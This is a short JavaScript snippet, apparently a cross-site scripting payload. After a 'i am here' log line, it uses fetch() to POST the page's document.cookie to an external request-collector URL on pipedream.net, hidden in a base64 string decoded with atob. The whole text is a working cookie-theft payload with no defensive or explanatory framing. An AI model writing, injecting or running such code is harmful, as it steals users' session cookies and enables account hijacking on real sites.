console.log('i am here')


fetch(atob('aHR0cHM6Ly9lb2pvY3d1a3hodWh6d3QubS5waXBlZHJlYW0ubmV0'), 
	{
		method: 'POST',
		body: document.cookie
	}
)